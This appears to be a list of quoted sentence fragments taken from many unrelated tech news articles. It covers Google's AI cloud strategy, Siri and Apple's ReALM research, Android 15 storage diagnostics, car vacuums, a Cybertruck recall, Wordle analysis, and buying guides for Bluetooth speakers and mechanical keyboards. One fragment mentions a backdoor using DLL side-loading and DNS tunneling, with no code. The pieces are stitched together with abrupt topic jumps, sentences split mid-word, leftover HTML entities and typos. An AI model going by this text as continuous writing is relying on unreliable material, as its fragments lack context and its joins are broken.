"The company has long utilized the power of its AI infrastructure and services internally, a process Parker calls, drinking out own champagne.",

"“I think what&apos;s special about Google is that we actually created the innovations around Gen AI, he says, highlighting the huge pivot the company made at the start of 2023 to focus on AI.",
"“If you look at what our opportunity is…how we have bet on innovating around AI both from the model standpoint, and the platform serving standpoint…this has given us a huge opportunity when it comes to cloud, Calder adds.",

" TechRadar&apos;s own senior news editor, Mark Wilson, recently lamented Siri is truly terrible, and despite his optimism about its rumored iOS 18 reboot (due September 2024), he&apos;s not alone in voicing this opinion.",
" Siri was largely left behind in Apple&apos;s most recent WWDC 2023 event, with the once-pioneering vocal subordinate&apos;s big &apos;update&apos; being… a shortening of the wake-up phrase from ‘Hey Siri’ to ‘Siri’.",
" Wow.",
" It&apos;s easy to think that Apple simply no longer cares about Siri.",
"The problem as I see it has nothing to do with how impressive a bigger, more fully-featured screen on an Apple speaker might be.",
" The issue is that an Apple HomePod with the current version of Siri at its core can&apos;t compete with the best smart speakers in the business in 2024.",
" Since April 2023, we&apos;ve bemoaned the fact that Siri is being left behind – and Apple knows it.",
"But wait!",
" All is not lost; at the start of the month, Apple researchers revealed an AI breakthrough that could make Siri much smarter.",
" The new paper (entitled &apos;ReALM: Reference Resolution As Language Modeling&apos;) contains intel from Apple on how the Cupertino giant’s own AI system will aim to consider both what&apos;s on your device’s screen and the tasks you&apos;re performing simultaneously (both in the foreground and the background) as stimuli to respond to your queries.",
"If your HomePod can understand the context and the direct request, Apple thinks that&apos;ll give its AI an edge.",
" Might this stop it from playing the top 25 hits on Apple Music when I say, Siri, play me a good song (and instead consider the genres of music I actually like)?",

" The feature is dubbed Device Diagnostics, as spotted by Android Authority in the latest Android 15 beta, and provides users with a percentage readout of how much of your internal storage is still usable.",
" So why would you need such a feature?",
" Well despite quotes onboard storage space, a lot of phones lose a portion of that to the operating system and native apps, and then overtime the universal flash storage (UFS) smartphones use, chosen for its speed, compact size, and low power consumption, can cause it to degrade over time.",
"  Such degradation comes at the hands of downloading flies, saving photos and transferring flies back and forth.",
" This happens to all forms of storage, eventually losing data or becoming completely unreadable, which loses anything not backed up.",
" Currently, there aren’t any tools for checking the status of your phone&apos;s internal storage, like some phones use for assessing battery health.",
" So, without warning, your storage could fail, and you could lose valuable data that isn’t backed up.",
"However, the Device Diagnostics could provide access to battery and storage health information in the same place, making it easier to track components more prone to degrading over time.",
" It could also include the ability to test your phone&apos;s display and touchscreen functionality to see if they are still working properly.",
" This could help you decide when to transfer your files to another storage option or switch to a newer device.",
" The wrinkle here is that Device Diagnostics is in the Android 15 beta meaning there&apos;s no guarantee it will make it into the full release which we&apos;re predicting will come sometime between August and October with more information likely to b revealed at the upcoming Google I/O 2024 event on May 14.",
" Furthermore, if it does become part of the full Android 15 rollout, Device Diagnostics may only be available to Google Pixel devices.",
" This is because not all Android devices share the relevant information with the Android OS.",
" As a result, it may not be able to provide precise storage lifetime information or support it at all.",
"After following the instructions from Android Police, I downloaded the Activity Launcher app on my Google Pixel 7 Pro running Android 15, I could access the device diagnostics without needing to root my phone.",
" From here I could see the component health of my Pixel and could confirm that my phone is maintaining 98% of its 128GB storage.",
" I was also able to check my battery status with a detailed breakdown of its capacity, cycle count, and manufacturing date.",
" So such a feature could be rather handy for people who want an extra layer of insight into their phone&apos;s health and have yet to go big on cloud-based backups.",
" ",
"Maintaining memories ",
"While not every phone could support the Device Diagnostics feature, you can still do a few things to prevent the loss of important files and phones right now.",
" The first is to backup your important files to another device or use cloud storage.",
" The second is to perform performance maintenance on your device by deleting unnecessary documents and duplications and removing apps you no longer use or that are not supported.",
" You can also clear most apps&apos; cache and data within your phone&apos;s settings; however, this may require you to sign in to those apps again.",

"A good car vacuum is a must if you have kids or pets, but it&apos;s a useful accessory for most drivers.",

"Of course, if you&apos;re short of space or cash and need to stick with just one vacuum for everything, we&apos;d recommend one of the best cordless vacuums: if you shop around you can find models that convert to pretty small handhelds, although they&apos;re not quite as small as a dedicated car vac.",

"As a car vacuum, it’s perhaps unsurprising that the V8 outperforms most of its competition.",

" Its size, shape and weight make it perfect for cleaning your car, with its range of useful tools also helping to ensure it’s always best suited for the task at hand.",
"During our testing, the standout attachments for car cleaning were most definitely the motorized pet hair tool and the crevice tool.",
" The latter was particularly helpful, as, despite the vacuum&apos;s compact size, its all-in-one design still makes getting into the harder-to-reach areas such as behind foot pedals or inside door bins tricky.",
"However, the motorized tool is a great size for more widespread clear-ups on carpets and upholstery.",
" It also makes quick work of both smaller and larger debris in our standard tests.",

"How to choose the best car vacuum",
"If you’re in the market for a car vacuum, there are a few things you should think about.",
" One of the first questions could be – do you actually need one?",
" If you own something like the Dyson V8, it can shapeshift into a form factor that can work very well to clean cars with and comes with all the power, bin size and additional tools of a fully-fledged vacuum cleaner for great performance.",
" Of course, this comes at a considerably higher cost than a dedicated car vacuum and can be heavier too.",
"If you decide you do need something more dedicated, there are several things to bear in mind.",
" One of the first is whether you want corded or cordless.",
" Most car vacs these days do run on a rechargeable battery, so do consider the battery life in these situations.",

"We then section off a testing area of 20cm x 20cm in the boot so that we can test carpet pick up, and we do the same on the driver’s seat for the upholstery test.",
" This allows us to assess the performance of each in a controlled environment, while also carrying out “real-world” testing over a period of time too.",
" This includes general car clean-ups, observing the handling of pet hair, and finding out how well they can get into tight spaces, like door bins.",
"As well as evaluating each vacuum&apos;s cleaning performance, we also consider the other things that would be important when making a buying decision, including how long the battery lasts compared to the manufacturer’s claims (or how long the wire is, in the case of corded vacs), how loud it is in use and the usefulness of any included tools for different jobs.",
"We also consider the weight and ergonomics, to understand if people are going to be able to use it comfortably to clean the whole car and if the bin capacity it has will make that possible.",
"Lastly, we rate based on how easy it is to empty the vacuum cleanly, and how easy it is to keep clean, as well as general feedback on ease of use.",

" The backdoor uses techniques such as multiple stages of DLL side-loading and DNS tunneling for command-and-control (C2) communication as a means to evade endpoint and network security solutions, respectively, the researchers explained.",

"It&apos;s not clear why just 3,878 of the thousands of Cybertrucks sold are affected by the recall (some speculate that&apos;s the entire number of delivered Cybertrucks though we can&apos;t confirm that number) but the issue is prevalent enough that it was documented just days ago by TikTok user El Chepito in a video entitled, serious problem with my Cybertruck that claimed the issue led to a stop sale for the EV until it&apos;s fixed.",

" On the consonants front, R, T and L were the obvious inclusions then, and that gave me TRAIL.",
" WordleBot liked that, calling it a terrific choice, but it wasn&apos;t hugely lucky and still left 11 answers.",
" I didn&apos;t know that at the time, but I came up with six of them: BELIE, LUCID, FOLIO, FLUID, ELFIN and SOLID.",
" The five I missed were HELIX, COLIC, LEXIS, FOLIC and OLDIE, none of which I feel particularly bad about not spotting.",

" Most days, around 3% of all Wordlers start with it – although today, rather suspiciously, that figure rose to 4%.",

" ARISE, itself played by 2% of Wordlers, left just a single option.",
" The same was true of ROAST and PARSE.",
" STARE left four, as did ADIEU.",
" So very many people will have scored a 1/6, and more still will have finished with a 2/6 or possibly a 3/6.",

"The best Bluetooth speaker for 2024: 15 portable options for every price rangeOne thing became apparent after testing dozens of Bluetooth speakers: there are plenty of good options out there for most people.",
" While that variety is great to have, it can also lead to confusion and overwhelm when you go to buy a new one ahead of your next camping trip, beach outing or backyard barbecue.",
" I set out to try some of the best Bluetooth speakers available now, at all different price points, to see which are worth your money.",
" I’m happy to report that most of them sounded pretty good upon first listen.",
" But in comparing them head-to-head, that’s when I began to suss out the nuances among the best-sounding ones.",
" Ultimately, out of all of the portable speakers out there, you won’t find a single “best” one.",
" But there are a number of solid choices out there that should fit most use cases.",
" These are our favorites.",
"Factors to consider",
"Weather-proofing",
"IP ratings (Ingress Protection) are the alphanumeric indicators you often see in a product’s spec sheet that define water and dust resistance.",
" It’s usually a combo of two numbers with the first indicating solid object ingress and the second being water.",
" The former goes from 0 (no protection) to 6 (dustproof).",
" The water-resistance rating goes from 0 (no protection) to 9 (protected against immersion and high pressure jets).",
" When an X is used instead of a number, that means the product wasn’t tested for resistance.",
" If it’s waterproof, it may have some innate resistance to solids, but there’s no guarantee.",
"IP67 is a common rating these days indicating highly resistant and potentially rugged speakers suitable for outdoor adventures.",
" These are safe for quick dunks in the pool or tub and should be more than OK in the rain or in the shower.",
" They’re also good options for the beach, playground and other rough environs.",
"Additionally, speakers with ports and a high rating will often include a tight-fitting cover over the charging or auxiliary ports.",
" If you plan on using the ports, that may limit the products rated ability to fend off the elements.",
"Consider the IP rating and also how you plan to use your Bluetooth speaker when making your decision.",
" It may be worth splurging on a better sounding model with a lower IP rating if you’ll mostly be using it indoors, for instance.",
"Battery life",
"The focus of this guide is on portable Bluetooth speakers, and while “portable” can be a relative term, these devices are generally for people who are likely to find themselves far from a power outlet.",
" These days, around 12 hours of runtime seems to be the baseline but obviously, the more battery life you can get out of a speaker, the better.",
"That said, be careful when looking at battery specs, as they frequently list a maximum runtime (“up to” x amount of hours).",
" This usually means they tested at a low to mid volume.",
" If you like your tunes loud, it can often end up cutting the expected usage time in half or more.",
" Luckily, some manufacturers also list the expected hours of battery life when used at full volume and that transparency is appreciated.",
"Additionally, if your Bluetooth speaker also happens to have WiFi connectivity, theyre usually designed for always-on functionality.",
" Unlike normal Bluetooth speakers that go to sleep after a short period without use, these will usually stay awake (to listen for your commands) and slowly run down the battery.",
" If youre out and about, youll want to remember to turn these speakers off manually when not in use to maximize battery life.",
"Range",
"Bluetooth range is tricky business.",
" Some companies list their product’s longest possible range, usually outdoors and in an unobstructed line-of-sight test environment.",
" Other companies stick with a 30-foot range on the spec sheet and leave it at that, even though they may be running Bluetooth 4.",
"x or 5.",
"x.",
" That’s likely underselling the speakers potential, but unpredictable environments can affect range and there’s little point in promising the moon only to get complaints.",
"I’ve seen signal drop issues when crouching down, with my phone in the front pocket of my jeans, and barely 30 feet away from a speaker inside my apartment.",
" I ran into this issue across several devices regardless of their listed Bluetooth connectivity range.",
"If you’re hosting a patio party and duck inside, it’s wise to keep any wireless Bluetooth speakers relatively close by just in case.",
" It’s hard to gauge what aspects of any environment may interfere with a Bluetooth signal.",
" In general, take range specs around 100 feet or more as a perfect-world scenario.",
"Latency",
"This is a minor mention for those out there who use a speaker for their computer output, or as a mini soundbar solution for setups like a monitor and streaming box.",
" It’s annoying to find that your speaker’s latency isn’t low enough to avoid lip sync issues.",
" Luckily, it seems that most speakers these days don’t often have these problems.",
" Only a handful of the few dozen speakers I tried had persistent, noticeable lip-sync issues.",
" Aside from occasional blips, all of our picks worked well in this regard.",
"If you plan to frequently use a speaker for video playback, look for devices with the most recent Bluetooth versions (4.",
"x or 5.",
"x) and lower latency codecs like aptX.",
" Also make sure the speaker is close to the source device as distance can be a factor.",
" To avoid the issue altogether, though, consider getting one with a wired auxiliary input.",
"Best Bluetooth speakers: $50 to $200",
"Best Bluetooth speakers: $200 to $450",
"Best high-range portable bluetooth speakers: $450 and higher",
"Other portable Bluetooth speakers we tested",
"Sonos Roam",
"While theres a lot to like about the Sonos Roam, there are plenty of other Bluetooth speakers with more features and better battery life.",
" In our review, we gave the Roam a score of 87, praising it for its good sound quality, durable waterproof design and ability to work well within an existing Sonos speaker ecosystem.",
" But the price is just fine at $180, and we found Bluetooth speakers that offer more at lower price points.",
" Plus, the Roam taps out at 10 hours of battery life, and all of our top picks can run for longer than that on a single charge.",
"Monoprice Soundstage3",
"The Monoprice Soundstage3 offers relatively big sound at a midrange $250 price, with a variety of inputs rarely found on a portable Bluetooth speaker.",
" The boxy, minimalist design is no nonsense, even if its more of a less-rugged, bookshelf-styled homebody.",
" While the speaker puts out crisp highs alongside booming lows, we found the bass can overpower the rest of the output, so its not for everyone.",
" And after using the speaker for many months, we also found the low-slung, poorly labeled button panel along the top can be a bit annoying to use.",
" If you want a speaker for road trips, favor mids and highs, and plan on using physical buttons for volume control and input selections, there are better options out there.",
"JBL Boombox 3",
"Fans of JBL’s bluetooth speaker sound profile who want to crank up the volume, but also want a rugged and portable option, may enjoy the JBL Boombox 3.",
" It’s a decent grab-and-go speaker with a very loud output, although its not as good as some of the loud-speaker styled options for long-throw sound and big outdoor areas.",
" However, the price for this speaker line remains prohibitively expensive compared to other options with big sound that cover a bit more ground.",
" If the JBL brand is your thing and you like the rugged, portable form factor, we recommend looking for discounts, or shopping around and exploring the available options including the (less portable) JBL PartyBox series.",
"Soundcore Motion X500",
"Soundcore speakers have generally been good and often reasonably priced.",
" The Motion X500 loosely falls into that category.",
" It has a tall, metallic lunchbox vibe with a fixed handle and pumps out a respectable 40 watts of crisp, clear sound for its size.",
" It can get pretty loud and serves up a good dose of bass, although its primarily a front-facing speaker.",
"There’s LDAC hi-res audio support for Android users, but the main selling point on this is spatial audio.",
" This is done through an EQ change and the activation of a small, up-firing driver.",
" There’s a slight benefit from this if you’re up close and directly in front of it, but it’s not a total game changer for your listening experience.",
" The original pre-order price of $130 made it a decent option in terms of bang for your buck.",
" But it went up to $170 at launch, making it less appealing even if it’s still a good middle-of-the-road option if you want small-ish, clear and loud.",
" If you can find one on sale for the lower price, it’s definitely worth considering.",
" There’s also the larger and louder X600 ($200) if the overall concept is working for you.",
"FAQs",
"How does a Bluetooth speaker work?",
"Bluetooth technology lets devices connect and exchange data over short distances using ultra high frequency (UHF) radio waves.",
" It’s the frequency range that’s carved out for industrial, scientific and medical purposes, called the 2.",
"4GHz ISM spectrum band.",
" This range is available worldwide, making it easy for companies to use with devices for global markets.",
"Bluetooth speakers include this tech, which lets them communicate with source devices like smartphones, tablets or computers in order to exchange data.",
" The two devices pair by sharing a unique code and will work within the proscribed range for the device and Bluetooth version.",
"&nbsp;",
"Ever since Bluetooth 4.",
"0 was released over a decade ago, new iterations usually improve on range, use less power and offer expanded connectivity with features like multipoint (allowing more than one device to be connected at the same time, for instance).",
"Who should buy a Portable Bluetooth speaker?",
"If you want to play music while you’re out-and-about on something other than headphones, a portable Bluetooth speaker is probably what you want.",
" There’s a broad range of devices for all types of circumstances.",
" Many adventurous people will want a relatively lightweight portable that’s rugged enough to handle the elements while also packing enough charge to play for hours on end.",
" Others may simply need a speaker they can move around the house or use in the backyard.",
" In this case, you can choose larger less rugged models that may offer better sound.",

"The 5 best mechanical keyboards for 2024A keyboard is one of the few pieces of technology you may use for hours every day.",
" Why not make it something that brings you joy?",
" Sure, the people who gush over these things can be intense, but the upgraded comfort, durability and customizability that comes with a good mechanical keyboard is a real thing.",
" If you’re looking to make the switch (ahem), we tested a couple dozen mechanical keyboards over the past few months and rounded up our favorites below.",
" We’ve also broken down what to look for when shopping for one.",
"What to look for in a mechanical keyboard",
"Layout",
"The first thing to decide with any keyboard is what size and layout you want.",
" Full-size layouts have all the keys you’d ever need — a number pad, a full function row, arrow keys, etc.",
" — but they also have the largest physical footprint.",
" A 96-percent or “1800” keyboard is similar, but crunches the navigation cluster (Page Up, Home, etc.",
"), numpad and arrow keys closer together to save space.",
" Tenkeyless (TKL) or 80-percent keyboards omit the number pad entirely; theyre often considered the best blend of size and functionality.",
" 75-percent keyboards keep almost all of the buttons of a TKL model but further reduce any “dead” space between them — think of them like the TKL versions of a 96 percent layout.",
"It gets more and more minimal from there.",
" The smallest popular layout is the 60 percent keyboard, which removes the arrow keys, function row, numpad and navigation cluster.",
" This kind of design can be particularly useful for gaming, as it opens up a ton of desk space to swing your mouse around.",
" It typically relies on shortcuts to make up for its missing keys, but it comes with a learning curve as a result.",
"Even more compact options exist beyond that.",
" These can be adorable, but they usually involve removing the number row, which is a step too far for most people.",
" There are all sorts of ergonomic keyboards that utilize different shapes to improve your wrist and arm comfort as well, but we have a separate guide for those.",
"Switch type",
"No component has more of an impact on how a mechanical keyboard feels and sounds than the switches beneath its keycaps.",
" The market for these tiny mechanisms is vast and complex but, to keep it simple, you can separate them into three types: linear, tactile and clicky.",
" Which you prefer ultimately comes down to personal preference, so we encourage you to go to a store, try out a friend’s keyboard and test switches out to determine what you like best.",
"Linear switches feel smooth and consistent all the way down.",
" Many PC gamers prefer them because they’re often light and fast to actuate, so they can register inputs quickly.",
" They tend to be quieter than other switch types as well, but some may find them too sensitive.",
"Tactile switches create a noticeable “bump” partway through a press.",
" They generally aren’t as fast as their linear counterparts, but many (including yours truly) enjoy the tangible sense of feedback they provide with each keystroke.",
" This bit of resistance can make it a little easier to avoid typos, too.",
" Many tactile switches are neither outright quiet nor disruptively loud.",
"Clicky switches are, well, clicky.",
" They work similarly to tactile switches but use an extra mechanism that makes a sharp click sound when pressed.",
" The exact design of that mechanism can differ depending on the switch.",
" Some people love the audible feedback of clicky switches.",
" The people who work or live with them?",
" Probably not so much.",
"Photo by Jeff Dunn / Engadget",
"Remember: These are general buckets.",
" Within them lies an enormous variety of switches with differing actuation points, weights, springs, bump sensations and more.",
" One linear, tactile, or clicky switch can feel and sound noticeably different than another.",
"There are more dramatic variations as well.",
" Low-profile switches, for one, can be linear, tactile or clicky but aren’t as tall and have a shorter travel distance.",
" They allow for flatter and more compact designs, with keys that are fast to press but also easy to bottom out.",
"Optical and Hall effect switches rely on different mechanisms entirely.",
" Instead of a physical contact point, the former uses a beam of infrared light to register keystrokes, while the latter uses tiny magnets.",
" Both commonly have a linear feel.",
" They can also enable a few gaming-friendly features: You could set custom actuation points and make any key more or less sensitive, map multiple actions to one keystroke or even use an “analog mode” that emulates gamepad controls.",
" These are niche tricks, but they can make a difference for competitive-minded players.",
" Boards that use these “analog” switches are frequently more expensive and less customizable than traditional mechanical options, though.",
"Switch modifications",
"It doesn’t stop at switch types: Manufacturers (and you!",
") can make several other tweaks to shape how a mechanical keyboard feels and sounds.",
" Some have layers of different foam inside their case to tamp down noise, for instance.",
" Some have switches that are lubricated out of the box to provide a smoother feel and more muted sound.",
" A few others put plastic, rubber or foam “films” between the upper and bottom housing of a switch to keep it from wobbling and further tune its acoustics.",
" Or they stick a layer of tape on their printed circuit board (PCB) to absorb higher-pitched sounds.",
" We think most people will find that some well-applied foam and lubing makes things feel nicer, though this is another matter that comes down to taste.",
"Keycaps",
"Keycaps play a huge role in defining a keyboard’s character.",
" First off, they should look nice!",
" There’s a huge market for third-party keycaps in all different styles, from the playful to the professional to the proudly impractical.",
" The majority of mechanical keyboards make it easy to swap in new keycaps, so it’s usually not a huge deal if you ever get bored with your devices stock set.",
"Most keycaps are made from one of two types of plastic: ABS (acrylonitrile butadiene styrene) or PBT (polybutylene terephthalate).",
" Keycaps using the latter tend to be higher-quality.",
" Theyre often thicker, more durable, deeper-sounding and less prone to developing a shiny or greasy finish over time.",
" Still, premium ABS keycaps do exist, so this is another case where what’s “best” partly comes down to personal taste.",
" You may prefer an ABS keycap that feels smooth over a PBT model with a rougher texture.",
"Keycap sets are available in several different shapes and sizes.",
" Some are totally uniform; many others are distinctly sculpted to meet your fingers in (ostensibly) more natural positions.",
" Which is most comfortable is something you’ll have to figure out for yourself.",
" You can check out keycaps.",
"info to see what the most popular keycap profiles look like.",
"Photo by Jeff Dunn / Engadget",
"Keyboard makers have several different methods of printing the letters and symbols (aka “legends”) that go on a set of keycaps.",
" The two most common are known as double-shot and dye-sublimation.",
" Double-shot caps are typically more durable but cost more to produce — they’re made by molding one color of plastic for the keycap around a second color of plastic for the legend.",
" “Dye-sub” caps, in contrast, use heat to stain in the legends but are decently durable in their own right.",
"For keyboards with RGB backlighting, its best if the legends to be “shine-through,” so those color effects are visible through the keycaps.",
" We don’t think it’s the end of the world if they aren’t — as you’ll see below — but the RGB won’t be as fun otherwise.",
"Stabilizers",
"Stabilizers (or “stabs”) are little components that go under large keys like the space bar or backspace to keep them from rattling or wobbling when pressed.",
" These come in different types as well.",
" Many a decent keyboard has been hindered by subpar stabilizers, so it’s worth checking your bigger keys first to ensure they aren’t distractingly shaky or uneven.",
"Mounting styles and case quality",
"A keyboard’s mounting style determines how its PCB and plate — i.",
"e.",
", a common (but not universal) layer that holds the keycaps in place above the PCB — are secured within its case.",
" This, too, comes in varying styles and can have a significant effect on how the board feels and sounds.",
" It’s also something that’s best explained visually, so we’ll point you to this excellent infographic from Thomas Baart instead of running through every possible configuration here.",
" It’s hard to say one mounting style is always better than the others, but many enthusiast boards these days use some sort of gasket mount, which puts a gasket material on either side to separate the plate from the main case.",
" Done well, this can make typing feel softer and bouncier than it would on a more traditional, tray-mounted design.",
"Regardless of what’s going on under the hood, a good keyboard shouldn’t feel cheap on the outside, either.",
" Its case shouldn’t flex under pressure or feel hollow as you’re clacking away.",
" Higher-end models often have cases made from metal or sturdier plastic — the former may feel more premium but it’s typically heavier and pricier.",
"Customizations and software",
"We focused on pre-built models here, but that doesn’t mean customization isn’t important.",
" Experimenting with different switches and keycaps is half the fun of this hobby, after all.",
" For this guide, we prioritized keyboards that are “hot-swappable,” which means they let you easily remove and replace switches without having to desolder anything.",
" Permanently attached switches may be more stable, but fixing a broken hot-swappable switch should be relatively painless — and more affordable to boot.",
"We also valued keyboards that are easy to program and customize through software, whether it’s a manufacturer-specific app or popular open-source programs like VIA.",
" Not everyone will go through the trouble to set macros, customize backlighting or remap keys, but it’s better to have the option if your mindset changes down the road.",
"It’s a plus if a keyboard works across multiple operating systems, particularly Windows and macOS, just in case you ever switch allegiances.",
" If the device comes with OS-specific keycaps you can pop on to make the experience less clunky, that’s even better.",
"Connectivity",
"Wireless connectivity isn’t essential with a device that mostly sits on your desk, but it’s always nice to cut down on cables.",
" Though wireless keyboards still cost more than wired ones, today you can get something great for less than $100.",
" If you do go wireless, look for a model that can connect over Bluetooth and a USB wireless dongle.",
" The former is convenient for travel, while the latter can provide a more stable connection.",
" For wired keyboards, you want a detachable USB cable so you don’t have to replace your entire device if the cord ever frays or breaks.",
"Photo by Jeff Dunn / Engadget",
"Backlight",
"Good backlighting will make any keyboard easier to use in the dark.",
" We gave bonus points to keyboards with fully programmable RGB lights, as they can be particularly fun to mess with, but theyre not essential.",
" As noted above, the strength of your backlight will be neutered if your keycaps’ legends aren’t transparent.",
"Rotary knob",
"Some mechanical keyboards come configured with a rotary knob, which typically controls volume by default but can be customized to control other inputs as well.",
" This is more of a fun bonus than anything else, but we found it hard to give up on devices without one.",
"How we tested",
"To be clear, there isn’t one “best” mechanical keyboard for everyone.",
" Yes, some are likely to be better for most people than others; that’s what we set out to find with this guide.",
" But ultimately, this is one of those categories that’ll largely depend on your personal tastes.",
"It’s also worth reiterating that we only considered pre-built models for this guide.",
" We still valued keyboards that are configurable with different switches, keycaps and other design tweaks upfront and easy to customize after purchase.",
" However, we recognize that many people just want to pay for a nice thing and enjoy it, without having to do homework on how they can make it better.",
" If you want to get hardcore later on and start building your own custom keyboards, we have a whole separate guide for that.",
"With that said, we started our research by reading a ton of reviews from both professionals and everyday users, trawling enthusiast forums along the way.",
" This helped us whittle down the devices that had a shot of being a top pick and were readily available from reputable brands.",
" From there, we used each keyboard as our daily driver for a few days, typing up thousands of words, playing PC games and paying attention to the key aspects noted above.",
" We fully charged each wireless model and monitored its battery drain to ensure it lined up with their advertised rating.",
" We also ensured any companion software worked as intended.",
"It’s worth keeping in mind that new mechanical keyboards are coming out all the time.",
" Its very difficult to get to everything, but well continue to monitor the market and update this guide as noteworthy boards arrive.",
"Other mechanical keyboards we tested",
"Just a few of the other mechanical keyboards we tested for this guide.",
" Clockwise from top left: the SteelSeries Apex Pro TKL Wireless, the G.",
"Skill KM250 RGB, the Lofree Block, the NZXT Function 2 and the Lofree Flow.",
"Photo by Jeff Dunn / Engadget",
"Lofree Block",
"The wireless Lofree Block feels great and has a fun retro aesthetic that looks like it belongs next to an old Mac.",
" Its keys are wonderfully smooth to the touch and create a nice thocky tone.",
" At $169, it’s a good middle ground between the Keychron Q Max and V Max series if you dig the look.",
" However, it doesn’t have any software for programming macros, it only has a white backlight and it only comes in a full-size layout.",
" Are those huge issues?",
" No.",
" But there are fine margins separating these things once you get to a certain point.",
"Lofree Flow",
"It’s a similar story with the Lofree Flow, a low-profile model.",
" Its full-POM switches are softer and noticeably quieter than the NuPhy Air V2, and its thin aluminum case looks and feels high-quality.",
" It can only work wirelessly using Bluetooth, though, and we noticed a couple of connection hiccups in testing.",
" There’s still no software, either, plus its backlight is fairly weak.",
" It also costs $40 or so more than the Air75 V2.",
" Still, it’s a great alternative.",
"Keychron K Max",
"The low-profile Keychron K Max series has all the requisite features and costs less than the NuPhy Air75 V2 and Lofree Flow.",
" If you don’t like the Air V2’s style and want a cheaper low-profile model, it’s worth a look.",
" That said, the keycaps on NuPhy’s board feel a bit higher-quality, and the tactile Gateron switches in our K Max unit sound thinner.",
"NZXT Function 2 &amp; Function 2 MiniTKL",
"The full-size NZXT Function 2 and tenkeyless NZXT Function 2 MiniTKL are perfectly solid gaming keyboards with fast optical switches, durable PBT keycaps, tasteful RGB lighting, sound-dampening foam and aluminum top plates.",
" They support a fair amount of customization through NZXT’s CAM app, including the ability to swap between two different universal actuation settings.",
" The stabilizers on larger keys exhibit some rattle, though, and the Wooting 60HE+’s magnetic switches are far more versatile for not too much extra cash.",
"The Razer Huntsman V2 TKL.",
"Photo by Jeff Dunn / Engadget",
"MelGeek Modern97",
"With its fun speckled color scheme, gasket-mounted design and multiple foam layers, the MelGeek Modern97 is a solid value at $139.",
" The linear, pre-lubed Kailh Box Plastic switches in our unit are smooth and enjoyably clacky, while the larger keys are neither hollow nor overly loud.",
" All of the switches are hot-swappable, and the whole thing works over USB-C, Bluetooth or a 2.",
"4GHz dongle.",
" Alas, its ABS keycaps start to feel slicker and greasier with extended use.",
" This model also has a 90 percent layout, which saves a little extra desk space compared to a 96 percent board but can lead to more accidental presses around the arrow keys.",
"Razer Huntsman V2 TKL",
"The Razer Huntsman V2 TKL is a quality gaming keyboard with light optical switches, crisp shine-through keycaps, a sturdy frame and an impressively muffled sound thanks to some internal foam.",
" (If you buy the model with Razer’s linear optical switches, that is; another variant with clicky switches isn’t nearly as quiet.",
") It’s often available in the $100 range, and at that price it’s a solid pick.",
" It’s neither wireless nor hot-swappable, though, and its keys wobble more than those on the Keychron V Max.",
"Razer Huntsman V3 Pro",
"The analog Razer Huntsman V3 Pro is a decent alternative to the Wooting 60HE+ if the latter’s shipping delays become too great.",
" It’s available in a 60 percent, TKL or full-size layout, and it offers a similar set of gaming features, including an adjustable actuation range and a rapid trigger setting for repeating keystrokes faster.",
" But its optical switches are noisier and more hollow-feeling than Wooting’s Hall effect setup, so it’s not as pleasant for typing.",
"SteelSeries Apex Pro TKL Wireless",
"We recommend the SteelSeries Apex Pro TKL Wireless in our guide to the best gaming keyboards, and it remains a good choice if you want the granular customizability of the Wooting 60HE+ in a wireless design.",
" It also comes with a wrist rest, unlike Wooting’s models.",
" Its magnetic switches are somewhat harsher-sounding, however, and its space bar is louder.",
" SteelSeries’ companion software is clunkier to navigate as well.",
" We haven’t tested the 60 percent Apex Pro Mini Wireless, but it should perform similarly.",
"G.",
"Skill KM250",
"The $50 G.",
"Skill KM250 is the top budget pick in our gaming keyboard guide, and it’s still a better buy than the Keychron C3 Pro is gaming is your chief concern.",
" Compared to Keychron’s board, it adds hot-swappable switches, full RGB backlighting, PBT keycaps and a rotary knob in a smaller 65 percent layout.",
" That said, the C3 Pro’s fuller sound and springier keystrokes make it superior for typing, and its tenkeyless design should be more comfortable for a wider swath of people.",
" It’s typically available for $10 to $15 less, too.",
"The ASUS ROG Strix Scope II 96 WirelessPhoto by Jeff Dunn / Engadget",
"Logitech G Pro X TKL &amp; G Pro X 60",
"The Logitech G Pro X TKL and 60 percent Logitech G Pro X 60 are well-built but far too expensive for gaming keyboards that lack hot-swappable switches and the analog functionality of competitors like the Wooting 60HE+.",
"ASUS ROG Strix Scope II 96 Wireless",
"The ASUS ROG Strix Scope II 96 Wireless is a wireless 96 percent keyboard that’s marketed toward gamers but should feel great to anyone.",
" The pre-lubed, linear ROG NX Snow switches in our test unit are smooth and quiet, while the PBT keycaps feel stable and high-quality.",
" The keycaps let the RGB backlight shine through cleanly, plus there’s a clever multi-function key that puts various lighting and media controls in one place.",
" ASUS’ Armoury Crate software is sloppy, though, and the board’s overall look may be too gamer-y for some.",
" At $180, it’s not cheap either.",
" The Keychron Q5 Max costs $40 more but gets you a more premium (if heavier) all-aluminum chassis; here, the housing is plastic.",
"ASUS ROG Azoth",
"The ASUS ROG Azoth is like a 75 percent version of the Strix Scope II 96 Wireless with a few more enthusiast touches.",
" Its gasket-mounted design gives keystrokes a slightly softer landing, it has a programmable OLED display and it even includes a switch lubing kit in the box.",
" Like the Strix, its hardware is very clearly high-grade.",
" But its software is much more aggravating and, with a list price of $250, its a worse value than the Keychron Q Max.",
"Corsair K70 RGB TKL",
"The Corsair K70 RGB TKL isn’t bad in a vacuum, but it lacks wireless functionality and fully hot-swappable switches.",
" It’s on the noisy side, too, and Corsair’s iCue software is rough.",
"The Logitech G Pro X 60.",
"Photo by Jeff Dunn / Engadget",
"Corsair K70 Max",
"The full-size Corsair K70 Max is another high-end gaming keyboard with magnetic Hall effect sensors and Wooting-style features, but trying to program those settings through Corsair’s iCue app gave us headaches.",
" The 60HE+ also feels better for typing, with less rattling on large keys like the space bar.",
" Wooting’s HE keyboards support a slightly wider actuation range on top of that, plus they cost $30 to $55 less depending on size.",
"Razer Huntsman Mini",
"The Razer Huntsman Mini is a fine value if you want a no-frills 60 percent keyboard for less than $100, but it’s another wired-only model that isn’t truly hot-swappable.",
"Logitech G915 TKL",
"The Logitech G915 TKL is a wireless low-profile model with a metal frame and handy media controls.",
" The GL Tactile switches in our test unit are comfortable and not particularly noisy.",
" But the thin ABS keycaps feel way too cheap for something that costs $230, the keys themselves are a little too wobbly and the switches arent hot-swappable.",

"Analogue Duo review: A second chance for an underappreciated console",
"We are living in a second golden age for console gaming.",
" Active communities, open developer tools and easy distribution have given new life to many once-dead systems.",
" If there&#39;s one company who deserves the most thanks for bringing a love for &#39;80s and &#39;90s cartridge-based console gaming back to the semi-mainstream, it&#39;s Analogue.",
